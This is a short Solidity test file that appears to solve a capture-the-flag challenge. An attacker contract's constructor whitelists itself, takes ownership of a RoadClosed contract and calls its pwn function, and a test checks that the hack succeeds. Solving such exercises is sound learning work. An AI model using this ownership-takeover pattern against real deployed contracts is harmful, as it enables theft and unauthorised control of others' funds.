// SPDX-License-Identifier: GPL-3.0
pragma solidity > 0.8.7;

import "../src/1.sol";
import "forge-std/Test.sol";

contract Attack1 {

	RoadClosed victim;

	constructor(address addr) {
		victim = RoadClosed(addr);

		address self = address(this);

		victim.addToWhitelist(self);
		victim.changeOwner(self);
		victim.pwn(self);
	}
}


contract Test1 is Test {
	function setUp() public {

	}
	function test1() public {
		RoadClosed rc = new RoadClosed();
		new Attack1(address(rc));

		require(rc.isHacked(), "hack fail");
	}
}
